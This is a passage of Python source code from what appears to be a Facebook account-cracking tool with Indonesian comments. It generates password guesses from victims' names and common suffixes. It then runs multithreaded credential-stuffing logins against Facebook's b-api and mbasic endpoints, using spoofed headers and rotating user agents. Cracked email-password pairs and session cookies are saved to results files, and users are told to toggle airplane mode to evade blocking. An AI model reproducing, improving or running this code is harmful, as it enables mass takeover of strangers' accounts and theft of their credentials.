                ditambah = celengg.replace(celeng+"Ditambahkan"," DiTambahkan")
                ak += 1
                apk.append(f'\n{jarak}{jarak}[{ak}] {I}{celeng}{U}{ditambah}{Q}')
            except:
                try:
                    celeng = asu.find('span').text
                    ak += 1
                    apk.append(f'\n{jarak}{jarak}[{ak}] {I}{celeng}{Q}')
                except:pass

    url2 = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive"
    dat_game = ses_.get(url2,cookies={'cookie':kukis})
    datagame = par(dat_game.content,'html.parser')
    form_    = datagame.find('form',method='post')
    data_texx = datagame.text
#    print(data_texx)
    if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in data_texx:
        apk.append(f"\n")
        apk.append(f"\n{jarak}{war}{M}Tidak Ada Aplikasi Yang Terkait{Q} ({K}APK Kedaluwarsa{Q}){Q}")
    else:
        apk.append(f"\n")
        apk.append(f"\n{jarak}{war}{I}Aplikasi Yang Terkait {Q}({K}APK Kedaluwarsa{Q}){Q}")
        for asu in form_.find_all("h3"):
            try:
                celeng = asu.find('span').text
                celengg = asu.find('div').text
                ditambah = celengg.replace(celeng+"Kedaluwarsa"," Kedaluwarsa")
                ek += 1
                apk.append(f'\n{jarak}{jarak}[{ek}] {K}{celeng}{C}{ditambah}{Q}')
            except:
                try:
                    celeng = asu.find('span').text
                    ak += 1
                    apk.append(f'\n{jarak}{jarak}[{ak}] {I}{celeng}{Q}')
                except:pass
    print(''.join(apk))
def visitor():
	try:
		datax = open(".datame", "r").read()
		datax = datax.split("User=")[1]
		try:
			ses_ = requests.Session()
			bhb = ""
			jhg = 1

			utl = "https://komarev.com/ghpvc/?username=jmbf&color=yellow"
			data_te = ses_.get(utl)
			gbl = par(data_te.content,'html.parser')
			for n in gbl.find_all("text"):
				bhb += (str(n))
			lee = bhb.split('y="14">')
			le = len(lee)
			le -= 1
			le = (lee[le].replace("</text>",""))
		except:
			le = ("NONE")
		#jalan("[++] Selamat Datang User Jmbf Yang Ke "+I+str(datax)+Q+" Dari "+I+str(le)+Q+" User Jmbf");time.sleep(2)
	except:
		try:
			url_vis = "https://github.com/Dumai-991/jmbf/blob/Xnxx/README.md"
			url_visi = "https://camo.githubusercontent.com/6123034813c11ae497e730dcba77572e83eb96016e5528c8a6f789b27891b99c/68747470733a2f2f6b6f6d617265762e636f6d2f67687076632f3f757365726e616d653d6a6d626626636f6c6f723d79656c6c6f77"
			ses_ = requests.Session()
			bhb = ""
			jhg = 1


			data_te = ses_.get(url_vis).text.strip()
			data_te = ses_.get(url_visi)
			gbl = par(data_te.content,'html.parser')
			for n in gbl.find_all("text"):
				bhb += (str(n))
			lee = bhb.split('y="14">')
			le = len(lee)
			le -= 1
			le = (lee[le].replace("</text>",""))
			hasil_ = (str(le))
			kiki = open(".datame", "w")
			kiki.write("User="+hasil_)
			kiki.close()
		except:pass

def gabung_pw():
	pq = ""
	bq = ""
	vv = 0
	cc = 0
	jalan("\n"+war+"Use a comma as separator")
	jalan(war+"Examples of Passwords that Admin Often Use :)")
	jalan(war+'Password '+I+'pakistan'+Q+' : pakistan,786786')
	jalan(war+'Password '+I+'pakistan OLD'+Q+' : pakistan123,pakistan,123456')
	paw = input(war+"Password : ").split(",")
	pakQ = open(".paww", "w")
	for n in paw:
		if len(n) <= 5:
			pq += (" "+n)
			vv += 1
		else:
			bq += (" "+n)
			cc += 1
			pakQ.write(n+"|")
	pakQ.close()
	if pq == "":
		pass
	else:
		jalan(war+"There is "+M+str(vv)+Q+" Unusable Password !")
	if bq == "":
		pass
	else:
		jalan(war+"There is "+I+str(cc)+Q+" Unusable Password !\n")
def cek_konek():
	try:
#		cek_jaringan = requests.post("https://github.com/Dumai-991/Dumai-991")
		cek_jaringan = requests.get("https://www.google.com/search?q=jmbf&oq=jmbf&aqs=chrome..69i57j69i60j0i512l3j0i30l3.1092j0j1&sourceid=chrome-mobile&ie=UTF-8")
		pass
	except requests.exceptions.ConnectionError:
		sys.stdout.write(f'\r{war}Your Network Is Disconnected !!'),
		sys.stdout.flush()
		cek_konek()
try:
	pln_tkn = open(".login.txt", "r").read()
except IOError:pass 	

#### BUAT SANDI :V
def buat_sandi():
	jalan(war+"Please choose a password, which you think is good !")


def buat_angka():
	kontol_hakiki = open(".paska", "w") # KONTOL HAKIKI
	print()
	jalan(war+M+"Enter a behind name, and use a comma as a separator"+Q)
	jalan(war+"Example : "+C+"123,1234,12345"+Q)
	paska = input(war+"pass : ")
	if paska == "" or paska == " ":
		jalan(war+"Don't Empty Bro")
		buat_angka()
	else:
		try:
			paska = paska.split(",")
			for n in paska:
				try:
					open(".paska", "a").write(str(int(n))+"|")
				except:pass
		except:
			try:
				open(".paska", "a").write(str(int(paska))+"|")
			except:pass

	hakiki_kntl = open(".paska", "r").read()
	if hakiki_kntl in ("", " ", "  ", "   "):
		jalan(war+"Enter Numbers, Not Letters :(")
		buat_angka()



def generateold(idt):
	results=[]
	try:
		jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+pln_tkn)
		op = json.loads(jok.text)
		text = op['name']
		for i in text.split(" "):
			i=i.lower()
			if len(i)>=6 :
				results.append(i)
				results.append(i+"123")
				results.append(i+"1234")
				results.append(i+"12345")
			else:
				results.append(i)
				results.append(i+"123")
				results.append(i+"1234")
				results.append(i+"12345")
				results.append(i+"12")
				results.append(i+"khan")
				results.append("pakistan")
	except:
		results.append("123456")
		results.append("123456789")
		results.append("sayang")
	return results
#def generate(text):
def generatev6(text):
	results=[]
	kiky_gg_gtg = text
	qz = text.split(" ")
	try:
		sj = open(".pass", "r").read()
	except:
		sj = ("KOSONG")
	try:
		paw = open(".paww", "r").read().split("|")
		for n in paw:
			if len(n)>= 5:
				try:
					baH = n.split("DEPAN")[1]
					kaw = "0"
				except:
					try:
						baH = n.split("depan")[1]
						kaw = "1"
					except:
						try:
							baH = n.split("lengkap")[1]
							kow = "2"
						except:
							kaw = "0"
							baH = ""
				if baH == "":
					results.append(n)
				if kow == "2":
					results.append(text)
				if kaw == "1":
					results.append(qz[0].lower()+baH)
				else:
					results.append(qz[0]+baH)
	except Exception as e:pass
	text = text.lower()
	kika = text.split(" ")
	results.append(kika[0])
	results.append(kika[0]+"123")
	results.append(kika[0]+"1234")
	results.append(kika[0]+"12345")
#	results.append(kika[0]+"123456")
	results.append(text)
	return results
"""	for i in text.split(" "):
		i=i.lower()
		if len(i)>=6 :
			results.append(i)
			results.append(i+"123")
			results.append(i+"1234")
			results.append(i+"12345")

		elif len(i)==3 or len(i)==4 or len(i)==5 :
			results.append(i+"123")
			results.append(i+"1234")
			results.append(i+"12345")

		else:
			results.append(i)
			results.append(i+"123")
			results.append(i+"1234")
			results.append(i+"12345")
			results.append(text)
	return results
"""
#def generatekotol(n__a):
def generate(n__a):
	bocil_alok_bersatu_melawan_pubg = []
	n__a = n__a.lower()
	text = n__a
	text = text.lower()
	try:dmi__gtg = open(".paska", "r").read()
	except:dmi__gtg = "123|1234|12345"
	dmi__gtg = dmi__gtg.split("|")

	nama_tt_ = n__a.split(" ")
	for nolep in dmi__gtg:  # <===== NAMA DEPAN AJA + ANGKA MANUAL
		bocil_alok_bersatu_melawan_pubg.append(nama_tt_[0]+nolep)
	bocil_alok_bersatu_melawan_pubg.append(text)
	try:sj = open(".pass", "r").read()     # <====== PASS GABUNGAN
	except:sj = ("KOSONG")
	try:
		paw = open(".paww", "r").read().split("|")
		for n in paw:
			if len(n)>= 5:
				bocil_alok_bersatu_melawan_pubg.append(n)
	except:pass




	return bocil_alok_bersatu_melawan_pubg   
####### VERSION SIMPEL
"""
		if len(i)>=6 :
			bocil_alok_bersatu_melawan_pubg.append(i+"123")
			bocil_alok_bersatu_melawan_pubg.append(i+"1234")
			bocil_alok_bersatu_melawan_pubg.append(i+"12345")
		elif len(i)==3 or len(i)==4 or len(i)==5 :
			bocil_alok_bersatu_melawan_pubg.append(i)
			bocil_alok_bersatu_melawan_pubg.append(i+"123")
			bocil_alok_bersatu_melawan_pubg.append(i+"1234")
			bocil_alok_bersatu_melawan_pubg.append(i+"12345")
		else:
			bocil_alok_bersatu_melawan_pubg.append(i)
			bocil_alok_bersatu_melawan_pubg.append(i+"123")
			bocil_alok_bersatu_melawan_pubg.append(i+"1234")
			bocil_alok_bersatu_melawan_pubg.append(i+"12345")

	bocil_alok_bersatu_melawan_pubg.append()
"""




def generatev4(text):
	results=[]
	kiky_gg_gtg = text
	qz = text.split(" ")
	try:
		sj = open(".pass", "r").read()
	except:
		sj = ("KOSONG")
	try:
		paw = open(".paww", "r").read().split("|")
		for n in paw:
			if len(n)>= 5:
				try:
					baH = n.split("DEPAN")[1]
					kaw = "0"
				except:
					try:
						baH = n.split("depan")[1]
						kaw = "1"
					except:
						try:
							baH = n.split("lengkap")[1]
							kow = "2"
						except:
							kaw = "0"
							baH = ""
				if baH == "":
					results.append(n)
				if kow == "2":
					results.append(text)
				if kaw == "1":
					results.append(qz[0].lower()+baH)
				else:
					results.append(qz[0]+baH)
	except Exception as e:pass
	text = text.lower()
	for i in text.split(" "):
		i=i.lower()
		if len(i)>=6 :
			results.append(i)
			results.append(i+"123")
			results.append(i+"1234")
			results.append(i+"12345")

		elif len(i)==3 or len(i)==4 or len(i)==5 :
			results.append(i+"123")
			results.append(i+"1234")
			results.append(i+"12345")

		else:
			results.append(i)
			results.append(i+"123")
			results.append(i+"1234")
			results.append(i+"12345")
			results.append(i+"123456")
			results.append(text)
	return results
def log_api_1(em,pas):
#    ua = _dapunta_dapunta_('ugent.txt','r').read()
    global ua
    r = requests.Session()
    header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),"x-fb-sim-hni": str(random.randint(20000, 40000)),"x-fb-net-hni": str(random.randint(20000, 40000)),"x-fb-connection-quality": "EXCELLENT","x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA","user-agent": ua,"content-type": "application/x-www-form-urlencoded","x-fb-http-engine": "Liger"}
    response = r.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + em + '&password=' + pas + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header)
    if 'session_key' in response.text and 'EAAA' in response.text:return {"status":"ok","email":em,"pass":pas}
    elif 'www.facebook.com' in response.json()['error_msg']:return {"status":"cp","email":em,"pass":pas}
    else:return {"status":"error","email":em,"pass":pas}
def log_api_2(em,pas):
 #   ua = _dapunta_dapunta_('ugent.txt','r').read()
    global ua
    r = requests.Session()
    header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),"x-fb-sim-hni": str(random.randint(10000, 40000)),"x-fb-net-hni": str(random.randint(10000, 40000)),"x-fb-connection-quality": "EXCELLENT","x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA","user-agent": ua,"content-type": "application/x-www-form-urlencoded","x-fb-http-engine": "Liger"}
    param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'json', 'sdk_version': '2', 'email': em, 'locale': 'en_US', 'password': pas, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig':'3f555f99fb61fcd7aa0c44f58f522ef6'}
    api = 'https://b-api.facebook.com/method/auth.login'
    response = r.get(api, params=param, headers=header)
    if 'session_key' in response.text and 'EAAA' in response.text:return {"status":"ok","email":em,"pass":pas}
    elif 'www.facebook.com' in response.json()['error_msg']:return {"status":"cp","email":em,"pass":pas}
    else:return {"status":"error","email":em,"pass":pas}
def log_mbasic_1(em,pas):
#    ua = _dapunta_dapunta_('ugent.txt','r').read()
    global ua
    r = requests.Session()
    r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    p = r.get("https://mbasic.facebook.com/")
    b = r.post("https://mbasic.facebook.com/login.php", data={"email": em, "pass": pas, "login": "submit"})
    _raw_cookies_ = (";").join([ "%s=%s" % (key, value) for key, value in r.cookies.get_dict().items() ])
    if "c_user" in r.cookies.get_dict().keys():return {"status":"ok","email":em,"pass":pas,"cookies":_raw_cookies_}
    elif "checkpoint" in r.cookies.get_dict().keys():return {"status":"cp","email":em,"pass":pas,"cookies":_raw_cookies_}
    else:return {"status":"error","email":em,"pass":pas}
def log_mbasic_2(em,pas):
#    ua = _dapunta_dapunta_('ugent.txt','r').read()
    global ua
    r = requests.Session()
    r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    p = r.get("https://mbasic.facebook.com/")
    b = bs4.BeautifulSoup(p.text,"html.parser")
    meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
    data={}
    for i in b("input"):
        if i.get("value") is None:
            if i.get("name")=="email":data.update({"email":em})
            elif i.get("name")=="pass":data.update({"pass":pas})
            else:data.update({i.get("name"):""})
        else:data.update({i.get("name"):i.get("value")})
    data.update({"fb_dtsg":meta,"m_sess":"","__user":"0","__req":"d","__csr":"","__a":"","__dyn":"","encpass":""})
    r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
    po = r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
    _raw_cookies_ = (";").join([ "%s=%s" % (key, value) for key, value in r.cookies.get_dict().items() ])
    if "c_user" in list(r.cookies.get_dict().keys()):return {"status":"ok","email":em,"pass":pas,"cookies":_raw_cookies_}
    elif "checkpoint" in list(r.cookies.get_dict().keys()):return {"status":"cp","email":em,"pass":pas,"cookies":_raw_cookies_}
    else:return {"status":"error","email":em,"pass":pas}

def log_api(em,pas,hosts):
    ua = random.choice(['Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]']);r = requests.Session();r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"});p = r.get("https://mbasic.facebook.com/");b = bs4.BeautifulSoup(p.text,"html.parser");meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text));data={}
    r = requests.Session()
    header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
        "x-fb-sim-hni": str(random.randint(20000, 40000)),
        "x-fb-net-hni": str(random.randint(20000, 40000)),
        "x-fb-connection-quality": "EXCELLENT",
        "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
        "user-agent": ua,
        "content-type": "application/x-www-form-urlencoded",
        "x-fb-http-engine": "Liger"}
    param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
        'format': 'json',
        'sdk_version': '2',
        'email': em,
        'locale': 'en_US',
        'password': pas,
        'sdk': 'ios',
        'generate_session_cookies': '1',
        'sig':'3f555f99fb61fcd7aa0c44f58f522ef6'}
    api = 'https://b-api.facebook.com/method/auth.login'
    response = r.get(api, params=param, headers=header)
    if 'session_key' in response.text and 'EAAA' in response.text:
        return {"status":"success","email":em,"pass":pas}
    elif 'www.facebook.com' in response.json()['error_msg']:
        return {"status":"cp","email":em,"pass":pas}
    else:return {"status":"error","email":em,"pass":pas}
def logger(em,pas,hosts):
    ua = random.choice(['Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]']);r = requests.Session();r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"});p = r.get("https://mbasic.facebook.com/");b = bs4.BeautifulSoup(p.text,"html.parser");meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text));data={}
    for i in b("input"):
        if i.get("value") is None:
            if i.get("name")=="email":data.update({"email":em})
            elif i.get("name")=="pass":data.update({"pass":pas})
            else:data.update({i.get("name"):""})
        else:data.update({i.get("name"):i.get("value")})
    data.update({"fb_dtsg":meta,"m_sess":"","__user":"0","__req":"d","__csr":"","__a":"","__dyn":"","encpass":""});r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"});po = r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
    if "c_user" in list(r.cookies.get_dict().keys()):return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
    elif "checkpoint" in list(r.cookies.get_dict().keys()):return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
    else:return {"status":"error","email":em,"pass":pas}
def log_mbasic(em,pas,hosts):
    global ua
    r = requests.Session()
    r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    p = r.get("https://mbasic.facebook.com/")
    b = bs4.BeautifulSoup(p.text,"html.parser")
    meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
    data={}
    for i in b("input"):
        if i.get("value") is None:
            if i.get("name")=="email":
                data.update({"email":em})
            elif i.get("name")=="pass":
                data.update({"pass":pas})
            else:
                data.update({i.get("name"):""})
        else:
            data.update({i.get("name"):i.get("value")})
    data.update(
        {"fb_dtsg":meta,"m_sess":"","__user":"0",
        "__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
        }
    )
    r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
    po = r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
    if "c_user" in list(r.cookies.get_dict().keys()):
        return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}

    elif "checkpoint" in list(r.cookies.get_dict().keys()):
        return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
    else:return {"status":"error","email":em,"pass":pas}
class crackmenu:

    def __init__(self,isifile):
        self.id = []
    def crackold(self,isifile):
        try:
            self.apk = isifile
            self.id = open(self.apk).read().splitlines()
        except:
            print(war+'File Not Found! Try Again')
            time.sleep(2)
            menu()
        if "KIKY_GTG" == "KIKY_GTG":
            while True:
                jalan(war+"Example Password : pakistan,khan1234,123456789")
                pwx = input('\n'+inp+"Enter Password : ")
                jalan("%sPassword Used : %s%s"%(war,I,pwx))
                if pwx == '':
                    jalan(war+"Fill Password Correctly !!")
                elif len(pwx)<=5:
                    jalan(war+"Password Minimum 6 letter !!")
                else:
                    tanya_opsi()
                    self.pro_ses()
                    def mobile_n(zsc=None):
                        with zthreads(max_workers=35) as (form):
                             for uid in self.id:
                                 try:
                                     userid = uid.split('|')[0]
                                     form.submit(self.mobile_,userid,zsc )
                                 except: pass
                        os.remove(self.apk)
                        exit(war+"Done !!")

                    mobile_n(pwx.split(','))
                    break	     

    def pro_ses(self):
        jalan("\n")
        jalan(war+M+"If there is an error, please report to admin !")
        jalan(war+M+"If No Result Turns On Turn Off Airplane Mode For 5 Seconds")
        jalan(war+"Crack Process is Running Please Wait : "+Q+"["+C+datetime.now().strftime('%H:%M:%S')+Q+"]")
        print(war+"On Turn Off Airplane Mode If No Result\n"+war+"Crack Results That CP Is Saved In : "+K+"Hasil/CP-"+durasi+".txt\n"+Q+war+"Crack Results That OK Is Saved In: "+I+"Hasil/OK-"+durasi+".txt\n\n"+Q)

    def menu_crack(self):   # METHOD AUTO PASSWROD
        jalan("\n"+war+P+"Please Select Login Method !")
        jalan(war+P+"Don't Forget To Turn On Turn Off Airplane Mode\n")
        print(Q+"[01] Method B-Api V1 ");time.sleep(0.02)
        print(Q+"[02] Method B-Api V2 ");time.sleep(0.02)
        print(Q+"[03] Method B-Api V3 ");time.sleep(0.02)
        print(Q+"[04] Method Mbasic V1 ");time.sleep(0.02)
        print(Q+"[05] Method Mbasic V2 ");time.sleep(0.02)
        print(Q+"[06] Method Mbasic V3 ");time.sleep(0.02)
        print(Q+"[07] Method Abdullah (OK IDS) \n");time.sleep(0.02)
    def menu_crack_m(self):   # METHOD MANUAL PASSWORD
        jalan("\n"+war+P+"Please Select Login Method !")
        jalan(war+P+"Don't Forget To Turn On Turn Off Airplane Mode\n")
        print(Q+"[01] Method B-Api V1      ( Fast Crack  ) ( Rawan Spam )");time.sleep(0.02)
        print(Q+"[02] Method B-Api V2      ( Fast Crack  ) ");time.sleep(0.02)
        print(Q+"[03] Method Mbasic V1     ( Slow Crack  )");time.sleep(0.02)
        print(Q+"[04] Method Mbasic V2     ( Fast Crack  )");time.sleep(0.02)
        print(Q+"[05] Method Abdullah (OK IDS)\n");time.sleep(0.02)

    def passmenu(self,isifile):
        try:
            self.apk = isifile
            self.id = open(self.apk).read().splitlines()
        except:
            print(war+'File Not Found! Try Again')
            time.sleep(2)
            menu()
        cjj = open(".paww", "w")
        print('\n'+war+'Please Select Password (Default/Manual/Combined)\n'+war+'[d/m/c] ?')
        zk = input(inp+'Choose : ')
        if zk in ('m','M','Manual','manual'):
            while True:
                jalan(war+"Example Password : pakistan,123456")
                pwx = input('\n'+inp+"Enter Password : ")
                jalan("%sPassword Used : %s%s"%(war,I,pwx))
                if pwx == '':
                    jalan(war+"Fill Password Correctly !!")
                elif len(pwx)<=5:
                    jalan(war+"Password Minimum 6 Letter !!")
                else:
                    tanya_opsi()
                    pilih_alam()
                    self.menu_crack_m()
                    jm = input(war+"Pilih :")
                    if jm == "":
                       jalan(war+"Fill it up correctly, Bro");time.sleep(1)
                       crackmenu().passmenu()
                    elif jm == "1" or jm == "01":
                       self.pro_ses()
                       def api_m(zsc=None):
                           with zthreads(max_workers=35) as (form):
                                for uid in self.id:
                                    try:
                                        userid = uid.split('|')[0]
                                        form.submit(self.api, userid, zsc)
                                    except: pass
                           os.remove(self.apk)
                           exit(war+"Done !!")
                       api_m(pwx.split(','))
                       break

                    elif jm == "2" or jm == "02":
                       self.pro_ses()
                       def apiv2_m(zsc=None):
                           with zthreads(max_workers=35) as (form):
                                for uid in self.id:
                                    try:
                                        userid = uid.split('|')[0]
                                        form.submit(self.__api__, userid, zsc)
                                    except: pass
                           os.remove(self.apk)
                           exit(war+"Done !!")
                       apiv2_m(pwx.split(','))
                       break

                    elif jm == "3" or jm == "03":
                       self.pro_ses()
                       def mbasic_m(zsc=None):
                           with zthreads(max_workers=35) as (form):
                                for uid in self.id:
                                    try:
                                        userid = uid.split('|')[0]
                                        form.submit(self.mbasic, userid, zsc)
                                    except: pass
                           os.remove(self.apk)
                           exit(war+"Done !!")
                       mbasic_m(pwx.split(','))
                       break

                    elif jm == "4" or jm == "04":
                       self.pro_ses()
                       def mbasicv2_m(zsc=None):
                           with zthreads(max_workers=35) as (form):
                                for uid in self.id:
                                    try:
                                        userid = uid.split('|')[0]
                                        form.submit(self.mbasicv1, userid, zsc)
                                    except: pass
                           os.remove(self.apk)
                           exit(war+"Done !!")

                       mbasicv2_m(pwx.split(','))
                       break
                    elif jm == "5" or jm == "05":
                       pilih_infong()
                       self.pro_ses()
                       def mobile_n(zsc=None):
                           with zthreads(max_workers=35) as (form):
                                for uid in self.id:
                                    try:
                                        userid = uid.split('|')[0]
                                        form.submit(self.mobile_,userid,zsc )
                                    except: pass
                           os.remove(self.apk)
                           exit(war+"Done !!")

                       mobile_n(pwx.split(','))
                       break
                    else:
                       jalan(war+"Fill it up correctly Bro");time.sleep(1)
                       crackmenu(isifile).passmenu(isifile)

        elif zk in ('d', 'D','Default','default'):
                tanya_opsi()
                pilih_alam()
                buat_angka()
                self.menu_crack() #Pilihan Method
                jm = input(war+"Choose :")
                if jm == "":
                   jalan(war+"Fill it up correctly Bro");time.sleep(1)
                   crackmenu().passmenu()
                elif jm == "1" or jm == "01":
                   self.pro_ses()
                   self.KangCilok()
                elif jm == "2" or jm == "02":
                   self.pro_ses()
                   self.KangSUGENG()
                elif jm == "3" or jm == "03":
                   self.pro_ses()
                   self.KangKETOD()
                elif jm == "4" or jm == "04":
                   self.pro_ses()
                   self.KangJORDI()
                elif jm == "5" or jm == "05":
                   self.pro_ses()
                   self.KangBANDAR()
                elif jm == "6" or jm == "06":
                   self.pro_ses()
                   self.KangAGEN()
                elif jm == "7" or jm == "07":
                   pilih_infong()
                   self.pro_ses()
                   self.KangCOLMEXXX()
#                   self.KangCOLMEXXXX()
                else:
                   jalan(war+"Fill it up correctly Bro");time.sleep(1)
                   crackmenu(isifile).passmenu(isifile)
        elif zk in ('C', 'c','Combined','combined','gabungan'):
                gabung_pw()
                tanya_opsi()
                pilih_alam()
                buat_angka()
                self.menu_crack() #Pilihan Method
                jm = input(war+"Choose :")
                if jm == "":
                   jalan(war+"Fill it up correctly Bro");time.sleep(1)
                   crackmenu().passmenu()
                elif jm == "1" or jm == "01":
                   self.pro_ses()
                   self.KangCilok()
                elif jm == "2" or jm == "02":
                   self.pro_ses()
                   self.KangSUGENG()
                elif jm == "3" or jm == "03":
                   self.pro_ses()
                   self.KangKETOD()
                elif jm == "4" or jm == "04":
                   self.pro_ses()
                   self.KangJORDI()
                elif jm == "5" or jm == "05":
                   self.pro_ses()
                   self.KangBANDAR()
                elif jm == "6" or jm == "06":
                   self.pro_ses()
                   self.KangAGEN()
                elif jm == "7" or jm == "07":
                   pilih_infong()
                   self.pro_ses()
                   self.KangCOLMEXXX()
                else:
                   jalan(war+"Fill it up correctly Bro");time.sleep(1)
                   crackmenu(isifile).passmenu(isifile)
        else:
            print(war+'Fill Correctly !')
            time.sleep(2)
            crackmenu(isifile).passmenu(isifile)
        return


    def api(self, user, zkth):
        global ok,cp,loop
        for pw in zkth:
#            pw = pw.lower()
            try: os.mkdir('Hasil')
            except: pass
            try:
                ua54 = open(".ua","r").read()
            except:
                ua54 = random.choice(['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+',
                                      'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11',
                                      'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'])
            headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua54,"content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
            api = 'https://b-api.facebook.com/method/auth.login'
            params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
            response = requests.get(api, params=params, headers=headers_)
            if 'access_token' in response.text and 'EAAA' in response.text:
                print ('\r%s[%s%s%s] %s%s|%s                 %s'%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,I,user,pw,q))
                wrt = ('%s|%s'%(user,pw))
                ok.append(wrt)
                bokep_japan_yang_terbaru("OK", user, pw, "-") # jangan diedit check akun tap yes
                open('Hasil/OK-'+durasi+'.txt' , 'a+').write('%s\n' % wrt)
                break
                continue
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    token = open(".login.txt").read()
